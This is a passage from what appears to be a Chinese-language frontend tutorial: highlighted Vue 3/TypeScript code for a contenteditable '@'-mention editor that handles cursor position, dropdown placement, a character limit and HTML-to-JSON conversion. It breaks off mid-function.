<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mention-wrapper"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 编辑区域 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
      <span class="hljs-attr">ref</span>=<span class="hljs-string">"editorRef"</span>
      <span class="hljs-attr">class</span>=<span class="hljs-string">"mention-editor"</span>
      <span class="hljs-attr">contenteditable</span>=<span class="hljs-string">"true"</span>
      @<span class="hljs-attr">input</span>=<span class="hljs-string">"onInput"</span>
      @<span class="hljs-attr">paste</span>=<span class="hljs-string">"onPaste"</span>
      @<span class="hljs-attr">compositionstart</span>=<span class="hljs-string">"onCompositionStart"</span>
      @<span class="hljs-attr">compositionupdate</span>=<span class="hljs-string">"onCompositionUpdate"</span>
      @<span class="hljs-attr">compositionend</span>=<span class="hljs-string">"onCompositionEnd"</span>
    &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">mention-modal</span>
      <span class="hljs-attr">v-if</span>=<span class="hljs-string">"showDropdown"</span>
      <span class="hljs-attr">:list</span>=<span class="hljs-string">"List"</span>
      @<span class="hljs-attr">hide-mention-modal</span>=<span class="hljs-string">"showDropdown = false"</span>
      @<span class="hljs-attr">insert-mention</span>=<span class="hljs-string">"selectUser"</span>
    &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mention-modal</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- 字符数统计 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"char-counter"</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"{ 'over-limit': currentCharCount &gt; MAX_CHARACTERS }"</span>&gt;</span>
      {{ currentCharCount }}/{{ MAX_CHARACTERS }}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>

<ul>
<li>
<p>智能提及：输入 @ 触发List下拉选择</p>
</li>
<li>
<p>数据双向转换：</p>
</li>
<li>
<p>HTML ↔️ JSON 结构化数据互转</p>
</li>
<li>
<p>便于存储和回显</p>
</li>
</ul>
<pre><code class="hljs language-js" lang="js">
<span class="hljs-comment">// ==================== 类型定义 ====================</span>
interface <span class="hljs-title class_">IMentionUser</span> {
  <span class="hljs-attr">id</span>: string | number;
  <span class="hljs-attr">name</span>: string;
}

interface <span class="hljs-title class_">IContentItem</span> {
  <span class="hljs-attr">type</span>: string;
  <span class="hljs-attr">content</span>: string;
  id?: string;
}

<span class="hljs-comment">// ==================== 常量定义 ====================</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">MAX_CHARACTERS</span> = <span class="hljs-number">1000</span>;
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CURSOR_OFFSET_TOP</span> = <span class="hljs-number">12</span>;
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CURSOR_OFFSET_LEFT</span> = <span class="hljs-number">5</span>;
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">MODAL_SAFE_MARGIN</span> = <span class="hljs-number">8</span>;
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">TEXT_SEARCH_MAX_LENGTH</span> = <span class="hljs-number">50</span>;

<span class="hljs-comment">// ==================== Props &amp; Emits ====================</span>
<span class="hljs-keyword">const</span> props = defineProps&lt;{
  <span class="hljs-attr">decisionContents</span>: <span class="hljs-title class_">IContentItem</span>[];
}&gt;();

<span class="hljs-keyword">const</span> emit = defineEmits&lt;{
  (<span class="hljs-attr">e</span>: <span class="hljs-string">'update:contents'</span>, <span class="hljs-attr">value</span>: { <span class="hljs-attr">content</span>: <span class="hljs-title class_">IContentItem</span>[] }): <span class="hljs-keyword">void</span>;
}&gt;();

<span class="hljs-comment">// ==================== 响应式状态 ====================</span>
<span class="hljs-keyword">const</span> editorRef = ref&lt;<span class="hljs-title class_">HTMLDivElement</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>);
<span class="hljs-keyword">const</span> showDropdown = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>);
<span class="hljs-keyword">const</span> queryText = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>);
<span class="hljs-keyword">const</span> activeIndex = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">const</span> modalRef = ref&lt;<span class="hljs-title class_">HTMLElement</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>);
<span class="hljs-keyword">const</span> top = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>);
<span class="hljs-keyword">const</span> left = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>);
<span class="hljs-keyword">const</span> solutionList = ref&lt;<span class="hljs-title class_">SolutionListItems</span>[]&gt;([]);
<span class="hljs-keyword">const</span> currentCharCount = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">const</span> isComposing = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>);
<span class="hljs-keyword">const</span> savedSelection = ref&lt;<span class="hljs-title class_">Selection</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>);
<span class="hljs-keyword">const</span> savedRange = ref&lt;<span class="hljs-title class_">Range</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>);

<span class="hljs-comment">// ==================== DOM 元素创建工具 ====================</span>
<span class="hljs-comment">/**
 * 创建 mention span 元素
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">name</span> - 显示名称
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">id</span> - 唯一标识
 * <span class="hljs-doctag">@returns</span> 创建的 span 元素
 */</span>
<span class="hljs-keyword">const</span> createMentionSpan = (<span class="hljs-attr">name</span>: string, <span class="hljs-attr">id</span>: string | number): <span class="hljs-function"><span class="hljs-params">HTMLSpanElement</span> =&gt;</span> {
  <span class="hljs-keyword">const</span> span = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'span'</span>);
  span.<span class="hljs-property">textContent</span> = name;
  span.<span class="hljs-property">className</span> = <span class="hljs-string">'mention-span'</span>;
  span.<span class="hljs-property">contentEditable</span> = <span class="hljs-string">'false'</span>;
  span.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">'data-id'</span>, <span class="hljs-title class_">String</span>(id));
  span.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">'data-name'</span>, name);
  span.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">'data-type'</span>, <span class="hljs-string">'solution'</span>);
  span.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">'data-info'</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ id, name }));
  <span class="hljs-keyword">return</span> span;
};

<span class="hljs-comment">/**
 * 创建文本节点
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">content</span> - 文本内容
 * <span class="hljs-doctag">@returns</span> 创建的文本节点
 */</span>
<span class="hljs-keyword">const</span> createTextNode = (<span class="hljs-attr">content</span>: string): <span class="hljs-function"><span class="hljs-params">Text</span> =&gt;</span> {
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createTextNode</span>(content);
};

<span class="hljs-comment">/**
 * 创建换行元素
 * <span class="hljs-doctag">@returns</span> 创建的 br 元素
 */</span>
<span class="hljs-keyword">const</span> createBreakElement = (): <span class="hljs-function"><span class="hljs-params">HTMLBRElement</span> =&gt;</span> {
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'br'</span>);
};

<span class="hljs-comment">// ==================== 光标操作工具 ====================</span>
<span class="hljs-comment">/**
 * 更新选择范围
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">range</span> - 要设置的范围
 */</span>
<span class="hljs-keyword">const</span> updateSelection = (<span class="hljs-attr">range</span>: <span class="hljs-title class_">Range</span>): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {
  <span class="hljs-keyword">const</span> sel = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">getSelection</span>();
  <span class="hljs-keyword">if</span> (sel) {
    sel.<span class="hljs-title function_">removeAllRanges</span>();
    sel.<span class="hljs-title function_">addRange</span>(range);
  }
};

<span class="hljs-comment">/**
 * 将光标移动到节点末尾
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">range</span> - 当前范围
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">node</span> - 目标节点
 */</span>
<span class="hljs-keyword">const</span> moveCursorToEnd = (<span class="hljs-attr">range</span>: <span class="hljs-title class_">Range</span>, <span class="hljs-attr">node</span>: <span class="hljs-title class_">Node</span>): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {
  <span class="hljs-keyword">if</span> (node?.<span class="hljs-property">parentNode</span>) {
    range.<span class="hljs-title function_">setStartAfter</span>(node);
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (editorRef.<span class="hljs-property">value</span>) {
    range.<span class="hljs-title function_">selectNodeContents</span>(editorRef.<span class="hljs-property">value</span>);
    range.<span class="hljs-title function_">collapse</span>(<span class="hljs-literal">false</span>);
  }
  range.<span class="hljs-title function_">collapse</span>(<span class="hljs-literal">true</span>);
  <span class="hljs-title function_">updateSelection</span>(range);
};

<span class="hljs-comment">/**
 * 获取当前选择范围
 * <span class="hljs-doctag">@returns</span> 当前选择范围
 */</span>
<span class="hljs-keyword">const</span> getCurrentRange = (): <span class="hljs-title class_">Range</span> | <span class="hljs-function"><span class="hljs-params">null</span> =&gt;</span> {
  <span class="hljs-keyword">const</span> sel = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">getSelection</span>();
  <span class="hljs-keyword">return</span> sel &amp;&amp; sel.<span class="hljs-property">rangeCount</span> &gt; <span class="hljs-number">0</span> ? sel.<span class="hljs-title function_">getRangeAt</span>(<span class="hljs-number">0</span>) : <span class="hljs-literal">null</span>;
};

<span class="hljs-comment">/**
 * 保存当前光标位置
 */</span>
<span class="hljs-keyword">const</span> saveCursorPosition = (): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {
  <span class="hljs-keyword">const</span> sel = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">getSelection</span>();
  <span class="hljs-keyword">if</span> (sel &amp;&amp; sel.<span class="hljs-property">rangeCount</span> &gt; <span class="hljs-number">0</span>) {
    savedSelection.<span class="hljs-property">value</span> = sel;
    savedRange.<span class="hljs-property">value</span> = sel.<span class="hljs-title function_">getRangeAt</span>(<span class="hljs-number">0</span>).<span class="hljs-title function_">cloneRange</span>();
  }
};

<span class="hljs-comment">/**
 * 恢复保存的光标位置
 */</span>
<span class="hljs-keyword">const</span> restoreCursorPosition = (): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {
  <span class="hljs-keyword">if</span> (savedSelection.<span class="hljs-property">value</span> &amp;&amp; savedRange.<span class="hljs-property">value</span>) {
    savedSelection.<span class="hljs-property">value</span>.<span class="hljs-title function_">removeAllRanges</span>();
    savedSelection.<span class="hljs-property">value</span>.<span class="hljs-title function_">addRange</span>(savedRange.<span class="hljs-property">value</span>);
  }
};

<span class="hljs-comment">/**
 * 重置下拉状态
 */</span>
<span class="hljs-keyword">const</span> resetDropdownState = (): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {
  showDropdown.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>;
  queryText.<span class="hljs-property">value</span> = <span class="hljs-string">''</span>;
  activeIndex.<span class="hljs-property">value</span> = <span class="hljs-number">0</span>;
  savedSelection.<span class="hljs-property">value</span> = <span class="hljs-literal">null</span>;
  savedRange.<span class="hljs-property">value</span> = <span class="hljs-literal">null</span>;
};

<span class="hljs-comment">// ==================== 光标位置计算 ====================</span>
<span class="hljs-comment">/**
 * 获取光标在可编辑容器中的相对坐标
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">container</span> - 可编辑容器元素
 * <span class="hljs-doctag">@returns</span> 光标相对位置
 */</span>
<span class="hljs-keyword">const</span> getCursorPositionInDiv = (<span class="hljs-attr">container</span>: <span class="hljs-title class_">Element</span>): { <span class="hljs-attr">left</span>: number; <span class="hljs-attr">top</span>: number } | <span class="hljs-function"><span class="hljs-params">null</span> =&gt;</span> {
  <span class="hljs-keyword">const</span> selection = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">getSelection</span>();
  <span class="hljs-keyword">if</span> (!selection?.<span class="hljs-property">rangeCount</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;

  <span class="hljs-keyword">const</span> range = selection.<span class="hljs-title function_">getRangeAt</span>(<span class="hljs-number">0</span>);
  <span class="hljs-keyword">const</span> rect = range.<span class="hljs-title function_">getBoundingClientRect</span>();
  <span class="hljs-keyword">const</span> containerRect = container.<span class="hljs-title function_">getBoundingClientRect</span>();

  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">left</span>: rect.<span class="hljs-property">left</span> - containerRect.<span class="hljs-property">left</span>,
    <span class="hljs-attr">top</span>: rect.<span class="hljs-property">top</span> - containerRect.<span class="hljs-property">top</span>,
  };
};

<span class="hljs-comment">/**
 * 约束弹层不超出容器右边界
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">container</span> - 可编辑容器元素
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">desiredLeft</span> - 期望的左偏移（相对容器）
 * <span class="hljs-doctag">@returns</span> 修正后的左偏移
 */</span>
<span class="hljs-keyword">const</span> clampLeftWithinContainer = (<span class="hljs-attr">container</span>: <span class="hljs-title class_">Element</span>, <span class="hljs-attr">desiredLeft</span>: number): <span class="hljs-function"><span class="hljs-params">number</span> =&gt;</span> {
  <span class="hljs-keyword">const</span> modalEl = modalRef.<span class="hljs-property">value</span>;
  <span class="hljs-keyword">if</span> (!modalEl) <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, desiredLeft);

  <span class="hljs-keyword">const</span> containerRect = container.<span class="hljs-title function_">getBoundingClientRect</span>();
  <span class="hljs-keyword">const</span> modalRect = modalEl.<span class="hljs-title function_">getBoundingClientRect</span>();
  <span class="hljs-keyword">const</span> modalWidth = modalRect.<span class="hljs-property">width</span> || modalEl.<span class="hljs-property">offsetWidth</span> || <span class="hljs-number">0</span>;
  <span class="hljs-keyword">const</span> containerWidth = containerRect.<span class="hljs-property">width</span>;
  <span class="hljs-keyword">const</span> overflowRight = desiredLeft + modalWidth - containerWidth;

  <span class="hljs-keyword">if</span> (overflowRight &gt; <span class="hljs-number">0</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, desiredLeft - overflowRight - <span class="hljs-variable constant_">MODAL_SAFE_MARGIN</span>);
  }
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, desiredLeft);
};

<span class="hljs-comment">/**
 * 更新下拉框位置
 */</span>
<span class="hljs-keyword">const</span> updateDropdownPosition = (): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {
  <span class="hljs-keyword">const</span> container = editorRef.<span class="hljs-property">value</span>;
  <span class="hljs-keyword">if</span> (!container) <span class="hljs-keyword">return</span>;

  <span class="hljs-keyword">const</span> position = <span class="hljs-title function_">getCursorPositionInDiv</span>(container);
  <span class="hljs-keyword">if</span> (!position) <span class="hljs-keyword">return</span>;

  <span class="hljs-keyword">const</span> desiredTop = position.<span class="hljs-property">top</span> + <span class="hljs-variable constant_">CURSOR_OFFSET_TOP</span>;
  <span class="hljs-keyword">const</span> desiredLeft = position.<span class="hljs-property">left</span> + <span class="hljs-variable constant_">CURSOR_OFFSET_LEFT</span>;

  <span class="hljs-title function_">nextTick</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> correctedLeft = <span class="hljs-title function_">clampLeftWithinContainer</span>(container, desiredLeft);
    top.<span class="hljs-property">value</span> = <span class="hljs-string">`<span class="hljs-subst">${desiredTop}</span>px`</span>;
    left.<span class="hljs-property">value</span> = <span class="hljs-string">`<span class="hljs-subst">${correctedLeft}</span>px`</span>;
  });
};
<span class="hljs-comment">// ==================== 内容获取工具 ====================</span>
<span class="hljs-comment">/**
 * 获取 HTML 内容
 * <span class="hljs-doctag">@returns</span> HTML 字符串
 */</span>
<span class="hljs-keyword">const</span> getHtml = (): <span class="hljs-function"><span class="hljs-params">string</span> =&gt;</span> editorRef.<span class="hljs-property">value</span>?.<span class="hljs-property">innerHTML</span> ?? <span class="hljs-string">''</span>;

<span class="hljs-comment">/**
 * 获取纯文本内容（用于字符数统计）
 * <span class="hljs-doctag">@returns</span> 纯文本内容
 */</span>
<span class="hljs-keyword">const</span> getPlainText = (): <span class="hljs-function"><span class="hljs-params">string</span> =&gt;</span> {
  <span class="hljs-keyword">if</span> (!editorRef.<span class="hljs-property">value</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>;
  <span class="hljs-keyword">return</span> editorRef.<span class="hljs-property">value</span>.<span class="hljs-property">textContent</span> || editorRef.<span class="hljs-property">value</span>.<span class="hljs-property">innerText</span> || <span class="hljs-string">''</span>;
};

<span class="hljs-comment">/**
 * 检查字符数是否超限
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">text</span> - 要检查的文本
 * <span class="hljs-doctag">@returns</span> 是否超限
 */</span>
<span class="hljs-keyword">const</span> isOverCharacterLimit = (<span class="hljs-attr">text</span>: string): <span class="hljs-function"><span class="hljs-params">boolean</span> =&gt;</span> {
  <span class="hljs-keyword">return</span> text.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">MAX_CHARACTERS</span>;
};

<span class="hljs-comment">// ==================== 内容解析工具 ====================</span>
<span class="hljs-comment">/**
 * 解析 mention 节点的 data-info 属性
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">element</span> - HTML 元素
 * <span class="hljs-doctag">@returns</span> mention 信息
 */</span>
<span class="hljs-keyword">const</span> parseMentionInfo = (<span class="hljs-attr">element</span>: <span class="hljs-title class_">HTMLElement</span>): { <span class="hljs-attr">id</span>: string; <span class="hljs-attr">name</span>: string } =&gt; {
  <span class="hljs-keyword">let</span> id = <span class="hljs-string">''</span>;
  <span class="hljs-keyword">let</span> name = element.<span class="hljs-property">textContent</span> || <span class="hljs-string">''</span>;

  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> dataInfo = element.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">'data-info'</span>);
    <span class="hljs-keyword">if</span> (dataInfo) {
      <span class="hljs-keyword">const</span> infoObj = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-built_in">decodeURIComponent</span>(dataInfo));
      id = infoObj.<span class="hljs-property">id</span> || <span class="hljs-string">''</span>;
      name = infoObj.<span class="hljs-property">name</span> || name;
    }
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'解析 mention 节点 data-info 出错:'</span>, e);
  }

  <span class="hljs-keyword">return</span> { id, name };
};

<span class="hljs-comment">/**
 * 检查节点是否有有效内容
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">child</span> - 子节点
 * <span class="hljs-doctag">@returns</span> 是否有有效内容
 */</span>
<span class="hljs-keyword">const</span> hasValidContent = (<span class="hljs-attr">child</span>: <span class="hljs-title class_">Node</span>): <span class="hljs-function"><span class="hljs-params">boolean</span> =&gt;</span> {
  <span class="hljs-keyword">if</span> (child.<span class="hljs-property">nodeType</span> === <span class="hljs-title class_">Node</span>.<span class="hljs-property">TEXT_NODE</span>) {
    <span class="hljs-keyword">return</span> (child.<span class="hljs-property">textContent</span> || <span class="hljs-string">''</span>).<span class="hljs-title function_">trim</span>().<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>;
  }
  <span class="hljs-keyword">if</span> (child.<span class="hljs-property">nodeType</span> === <span class="hljs-title class_">Node</span>.<span class="hljs-property">ELEMENT_NODE</span>) {
    <span class="hljs-keyword">const</span> el = child <span class="hljs-keyword">as</span> <span class="hljs-title class_">HTMLElement</span>;
    <span class="hljs-keyword">return</span> el.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">'data-type'</span>) === <span class="hljs-string">'solution'</span> || el.<span class="hljs-property">tagName</span>.<span class="hljs-title function_">toLowerCase</span>() !== <span class="hljs-string">'br'</span>;
  }
  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
};

<span class="hljs-comment">/**
 * 将 HTML 内容转换为结构化数据
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">htmlContent</span> - HTML 内容
 * <span class="hljs-doctag">@returns</span> 结构化内容数组
 */</span>
<span class="hljs-keyword">const</span> getContent = (<span class="hljs-attr">htmlContent</span>: string): <span class="hljs-title class_">IContentItem</span>[] =&gt; {
  <span class="hljs-keyword">const</span> parser = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMParser</span>();
  <span class="hljs-keyword">const</span> doc = parser.<span class="hljs-title function_">parseFromString</span>(htmlContent, <span class="hljs-string">'text/html'</span>);
  <span class="hljs-keyword">const</span> <span class="hljs-attr">result</span>: <span class="hljs-title class_">IContentItem</span>[] = [];

  <span class="hljs-keyword">const</span> walk = (<span class="hljs-attr">node</span>: <span class="hljs-title class_">Node</span>): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {
    <span class="hljs-keyword">switch</span> (node.<span class="hljs-property">nodeType</span>) {
      <span class="hljs-keyword">case</span> <span class="hljs-title class_">Node</span>.<span class="hljs-property">TEXT_NODE</span>: {
        <span class="hljs-keyword">const</span> text = node.<span class="hljs-property">textContent</span>;
        <span class="hljs-keyword">if</span> (text) {
          result.<span class="hljs-title function_">push</span>({ <span class="hljs-attr">type</span>: <span class="hljs-string">'text'</span>, <span class="hljs-attr">content</span>: text });
        }
        <span class="hljs-keyword">break</span>;
      }
      <span class="hljs-keyword">case</span> <span class="hljs-title class_">Node</span>.<span class="hljs-property">ELEMENT_NODE</span>: {
        <span class="hljs-keyword">const</span> element = node <span class="hljs-keyword">as</span> <span class="hljs-title class_">HTMLElement</span>;
        <span class="hljs-keyword">const</span> tagName = element.<span class="hljs-property">tagName</span>?.<span class="hljs-title function_">toLowerCase</span>();
        <span class="hljs-keyword">const</span> mentionType = element.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">'data-type'</span>);

        <span class="hljs-keyword">if</span> (mentionType === <span class="hljs-string">'solution'</span>) {
          <span class="hljs-keyword">const</span> { id, name } = <span class="hljs-title function_">parseMentionInfo</span>(element);
          result.<span class="hljs-title function_">push</span>({ <span class="hljs-attr">type</span>: <span class="hljs-string">'solution'</span>, <span class="hljs-attr">content</span>: name, id });
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (tagName === <span class="hljs-string">'br'</span>) {
          result.<span class="hljs-title function_">push</span>({ <span class="hljs-attr">type</span>: <span class="hljs-string">'text'</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'\n'</span> });
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (tagName === <span class="hljs-string">'div'</span> || tagName === <span class="hljs-string">'p'</span>) {
          <span class="hljs-keyword">const</span> childNodes = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(node.<span class="hljs-property">childNodes</span>);
          <span class="hljs-keyword">const</span> hasContent = childNodes.<span class="hljs-title function_">some</span>(hasValidContent);

          <span class="hljs-keyword">if</span> (hasContent) {
            childNodes.<span class="hljs-title function_">forEach</span>(walk);
            result.<span class="hljs-title function_">push</span>({ <span class="hljs-attr">type</span>: <span class="hljs-string">'text'</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'\n'</span> });
          } <span class="hljs-keyword">else</span> {
            result.<span class="hljs-title function_">push</span>({ <span class="hljs-attr">type</span>: <span class="hljs-string">'text'</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'\n'</span> });
          }
        } <span class="hljs-keyword">else</span> {
          node.<span class="hljs-property">childNodes</span>.<span class="hljs-title function_">forEach</span>(walk);
        }
        <span class="hljs-keyword">break</span>;
      }
      <span class="hljs-attr">default</span>:
        <span class="hljs-keyword">break</span>;
    }
  };

  doc.<span class="hljs-property">body</span>.<span class="hljs-property">childNodes</span>.<span class="hljs-title function_">forEach</span>(walk);
  <span class="hljs-keyword">return</span> result;
};

<span class="hljs-comment">// ==================== 内容更新 ====================</span>
<span class="hljs-comment">/**
 * 输入变化处理
 */</span>
<span class="hljs-keyword">const</span> onChange = (): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {
  currentCharCount.<span class="hljs-property">value</span> = <span class="hljs-title function_">getPlainText</span>().<span class="hljs-property">length</span>;
  <span class="hljs-title function_">emit</span>(<span class="hljs-string">'update:contents'</span>, {
    <span class="hljs-attr">content</span>: <span class="hljs-title function_">getContent</span>(<span class="hljs-title function_">getHtml</span>()),
  });
};

<span class="hljs-comment">// ==================== 文本节点处理 ====================</span>
<span class="hljs-comment">/**
 * 在 br 标签后创建文本节点
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">element</span> - br 元素
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">selection</span> - 当前选择对象
 * <span class="hljs-doctag">@returns</span> 创建的文本节点
 */</span>
<span class="hljs-keyword">const</span> createTextNodeAfterBr = (<span class="hljs-attr">element</span>: <span class="hljs-title class_">HTMLElement</span>, <span class="hljs-attr">selection</span>: <span class="hljs-title class_">Selection</span>): <span class="hljs-function"><span class="hljs-params">Text</span> =&gt;</span> {
  <span class="hljs-keyword">const</span> range = selection.<span class="hljs-title function_">getRangeAt</span>(<span class="hljs-number">0</span>);
  <span class="hljs-keyword">const</span> textNode = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createTextNode</span>(<span class="hljs-string">''</span>);

  <span class="hljs-keyword">if</span> (element.<span class="hljs-property">nextSibling</span>) {
    element.<span class="hljs-property">parentNode</span>?.<span class="hljs-title function_">insertBefore</span>(textNode, element.<span class="hljs-property">nextSibling</span>);
  } <span class="hljs-keyword">else</span> {
    element.<span class="hljs-property">parentNode</span>?.<span class="hljs-title function_">appendChild</span>(textNode);
  }

  range.<span class="hljs-title function_">setStart</span>(textNode, <span class="hljs-number">0</span>);
  range.<span class="hljs-title function_">setEnd</span>(textNode, <span class="hljs-number">0</span>);
  selection.<span class="hljs-title function_">removeAllRanges</span>();
  selection.<span class="hljs-title function_">addRange</span>(range);

  <span class="hljs-keyword">return</span> textNode;
};

<span class="hljs-comment">/**
 * 获取光标所在或附近的文本节点
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">selection</span> - 当前选择对象
 * <span class="hljs-doctag">@returns</span> 文本节点
 */</span>
<span class="hljs-keyword">const</span> getTextNodeAtCursor = (<span class="hljs-attr">selection</span>: <span class="hljs-title class_">Selection</span>): <span class="hljs-title class_">Text</span> | <span class="hljs-function"><span class="hljs-params">null</span> =&gt;</span> {
  <span class="hljs-keyword">if</span> (!selection?.<span class="hljs-property">anchorNode</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;

  <span class="hljs-keyword">const</span> { anchorNode } = selection;

  <span class="hljs-keyword">if</span> (anchorNode.<span class="hljs-property">nodeType</span> === <span class="hljs-title class_">Node</span>.<span class="hljs-property">TEXT_NODE</span>) {
    <span class="hljs-keyword">return</span> anchorNode <span class="hljs-keyword">as</span> <span class="hljs-title class_">Text</span>;
  }

  <span class="hljs-keyword">if</span> (anchorNode.<span class="hljs-property">nodeType</span> === <span class="hljs-title class_">Node</span>.<span class="hljs-property">ELEMENT_NODE</span>) {
    <span class="hljs-keyword">const</span> element = anchorNode <span class="hljs-keyword">as</span> <span class="hljs-title class_">HTMLElement</span>;
    <span class="hljs-keyword">const</span> tagName = element.<span class="hljs-property">tagName</span>?.<span class="hljs-title function_">toLowerCase</span>();

    <span class="hljs-keyword">if</span> (tagName === <span class="hljs-string">'br'</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-title function_">createTextNodeAfterBr</span>(element, selection);
    }

    <span class="hljs-keyword">const</span> textNode = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(element.<span class="hljs-property">childNodes</span>).<span class="hljs-title function_">find</span>(<span class="hljs-function">(<span class="hljs-params">node</span>) =&gt;</span> node.<span class="hljs-property">nodeType</span> === <span class="hljs-title class_">Node</span>.<span class="hljs-property">TEXT_NODE</span>) <span class="hljs-keyword">as</span>
      | <span class="hljs-title class_">Text</span>
      | <span class="hljs-literal">undefined</span>;
    <span class="hljs-keyword">if</span> (textNode) <span class="hljs-keyword">return</span> textNode;
  }

  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
};

<span class="hljs-comment">/**
 * 检查节点是否应该停止搜索
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">node</span> - 节点
 * <span class="hljs-doctag">@returns</span> 是否应该停止
 */</span>
<span class="hljs-keyword">const</span> shouldStopSearch = (<span class="hljs-attr">node</span>: <span class="hljs-title class_">Node</span>): <span class="hljs-function"><span class="hljs-params">boolean</span> =&gt;</span> {
